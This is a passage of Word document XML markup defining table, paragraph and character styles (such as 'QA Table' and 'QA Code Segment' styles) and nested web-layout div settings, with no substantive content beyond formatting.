          <w:right w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
          <w:bottom w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="GridTable1Light-Accent1">
    <w:name w:val="Grid Table 1 Light Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="46"/>
    <w:locked/>
    <w:rsid w:val="00D96191"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="4" w:space="0" w:color="71BAFF" w:themeColor="accent1" w:themeTint="66"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="71BAFF" w:themeColor="accent1" w:themeTint="66"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="71BAFF" w:themeColor="accent1" w:themeTint="66"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="71BAFF" w:themeColor="accent1" w:themeTint="66"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="71BAFF" w:themeColor="accent1" w:themeTint="66"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="71BAFF" w:themeColor="accent1" w:themeTint="66"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="2A98FF" w:themeColor="accent1" w:themeTint="99"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="2" w:space="0" w:color="2A98FF" w:themeColor="accent1" w:themeTint="99"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="PlainTable3">
    <w:name w:val="Plain Table 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="99"/>
    <w:locked/>
    <w:rsid w:val="00D96191"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:caps/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="4" w:space="0" w:color="989593"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989593"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locked/>
    <w:rsid w:val="00D06F8E"/>
    <w:pPr>
      <w:spacing w:after="0"/>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1">
    <w:name w:val="Plain Table 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="41"/>
    <w:locked/>
    <w:rsid w:val="00D06F8E"/>
    <w:pPr>
      <w:spacing w:after="0"/>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QATable3">
    <w:name w:val="QA Table 3"/>
    <w:basedOn w:val="QATable2"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00965302"/>
    <w:tblPr>
      <w:tblBorders>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:wordWrap/>
        <w:spacing w:beforeLines="0" w:before="0" w:beforeAutospacing="0" w:afterLines="0" w:after="0" w:afterAutospacing="0"/>
        <w:contextualSpacing/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:caps/>
        <w:smallCaps w:val="0"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
          <w:tl2br w:val="nil"/>
          <w:tr2bl w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:pPr>
        <w:wordWrap/>
        <w:spacing w:beforeLines="0" w:before="0" w:beforeAutospacing="0" w:afterLines="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:leftChars="0" w:left="0" w:rightChars="0" w:right="0"/>
        <w:contextualSpacing/>
        <w:mirrorIndents w:val="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:caps/>
        <w:smallCaps w:val="0"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:right w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="QATable1">
    <w:name w:val="QA Table 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00C12F2E"/>
    <w:pPr>
      <w:spacing w:before="120"/>
    </w:pPr>
    <w:tblPr/>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="QATableActionPlan">
    <w:name w:val="QA Table Action Plan"/>
    <w:basedOn w:val="QATable2"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="006F3EEC"/>
    <w:tblPr>
      <w:tblBorders>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:wordWrap/>
        <w:spacing w:beforeLines="0" w:before="0" w:beforeAutospacing="0" w:afterLines="0" w:after="0" w:afterAutospacing="0"/>
        <w:contextualSpacing/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:caps w:val="0"/>
        <w:smallCaps w:val="0"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
          <w:tl2br w:val="nil"/>
          <w:tr2bl w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:pPr>
        <w:wordWrap/>
        <w:spacing w:beforeLines="0" w:before="0" w:beforeAutospacing="0" w:afterLines="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:leftChars="0" w:left="0" w:rightChars="0" w:right="0"/>
        <w:contextualSpacing/>
        <w:mirrorIndents w:val="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:caps w:val="0"/>
        <w:smallCaps w:val="0"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:right w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="QAStylelist">
    <w:name w:val="QA Style list"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="0072244D"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="3"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00965302"/>
    <w:rPr>
      <w:color w:val="134983" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="PlainTable5">
    <w:name w:val="Plain Table 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="45"/>
    <w:locked/>
    <w:rsid w:val="009A62A9"/>
    <w:pPr>
      <w:spacing w:after="0"/>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989593"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989593"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989593"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989593"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QATable4">
    <w:name w:val="QA Table 4"/>
    <w:basedOn w:val="QATable1"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="003E1B52"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblBorders>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
        <w:b/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
          <w:tl2br w:val="nil"/>
          <w:tr2bl w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QACodeSegment">
    <w:name w:val="QA Code Segment"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QACodeSegmentChar"/>
    <w:qFormat/>
    <w:rsid w:val="0097086D"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="24" w:space="1" w:color="B8DCFF" w:themeColor="accent1" w:themeTint="33"/>
        <w:left w:val="single" w:sz="24" w:space="4" w:color="B8DCFF" w:themeColor="accent1" w:themeTint="33"/>
        <w:bottom w:val="single" w:sz="24" w:space="1" w:color="B8DCFF" w:themeColor="accent1" w:themeTint="33"/>
        <w:right w:val="single" w:sz="24" w:space="4" w:color="B8DCFF" w:themeColor="accent1" w:themeTint="33"/>
      </w:pBdr>
      <w:shd w:val="clear" w:color="auto" w:fill="B8DCFF" w:themeFill="accent1" w:themeFillTint="33"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Courier New"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QACodeSegmentChar">
    <w:name w:val="QA Code Segment Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="QACodeSegment"/>
    <w:rsid w:val="0097086D"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Courier New"/>
      <w:color w:val="2E2D2C"/>
      <w:szCs w:val="22"/>
      <w:shd w:val="clear" w:color="auto" w:fill="B8DCFF" w:themeFill="accent1" w:themeFillTint="33"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="QATable5">
    <w:name w:val="QA Table 5"/>
    <w:basedOn w:val="QATable3"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="005111DB"/>
    <w:rPr>
      <w:color w:val="6D6D6D" w:themeColor="background2" w:themeShade="80"/>
    </w:rPr>
    <w:tblPr>
      <w:tblBorders>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="6D6D6D" w:themeColor="background2" w:themeShade="80"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="6D6D6D" w:themeColor="background2" w:themeShade="80"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:wordWrap/>
        <w:spacing w:beforeLines="0" w:before="0" w:beforeAutospacing="0" w:afterLines="0" w:after="0" w:afterAutospacing="0"/>
        <w:contextualSpacing/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:caps/>
        <w:smallCaps w:val="0"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
          <w:tl2br w:val="nil"/>
          <w:tr2bl w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:pPr>
        <w:wordWrap/>
        <w:spacing w:beforeLines="0" w:before="0" w:beforeAutospacing="0" w:afterLines="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:leftChars="0" w:left="0" w:rightChars="0" w:right="0"/>
        <w:contextualSpacing/>
        <w:mirrorIndents w:val="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:caps/>
        <w:smallCaps w:val="0"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:right w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QACodeWord">
    <w:name w:val="QA Code Word"/>
    <w:basedOn w:val="QACodeSegmentChar"/>
    <w:uiPriority w:val="1"/>
    <w:rsid w:val="0085758C"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Courier New"/>
      <w:color w:val="2E2D2C"/>
      <w:szCs w:val="22"/>
      <w:shd w:val="clear" w:color="auto" w:fill="B9CDE5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:locked/>
    <w:rsid w:val="00840C10"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QANumbers">
    <w:name w:val="QA Numbers"/>
    <w:link w:val="QANumbersChar"/>
    <w:qFormat/>
    <w:rsid w:val="005D0013"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="6"/>
      </w:numPr>
      <w:spacing w:before="120"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cs="Arial"/>
      <w:bCs/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
      <w:sz w:val="24"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QANumbersChar">
    <w:name w:val="QA Numbers Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="QANumbers"/>
    <w:rsid w:val="005D0013"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cs="Arial"/>
      <w:bCs/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
      <w:sz w:val="24"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00275A56"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00275A56"/>
    <w:rPr>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00275A56"/>
    <w:rPr>
      <w:color w:val="2E2D2C"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="UnresolvedMention1">
    <w:name w:val="Unresolved Mention1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00E4517A"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="UnresolvedMention2">
    <w:name w:val="Unresolved Mention2"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004611DC"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00CC1654"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>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1551775">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1507670097">
          <w:marLeft w:val="547"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="266353882">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1051004858">
          <w:marLeft w:val="547"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1408645756">
          <w:marLeft w:val="547"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="760371878">
          <w:marLeft w:val="547"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1170095866">
          <w:marLeft w:val="547"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="116530495">
          <w:marLeft w:val="547"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="284433552">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="213584373">
          <w:marLeft w:val="547"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="417335501">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="418985403">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="439951676">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="932667626">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1966227809">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1014192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9327252">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="422578447">
          <w:marLeft w:val="547"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="455173512">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1718623642">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="685135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747847">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="599528840">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
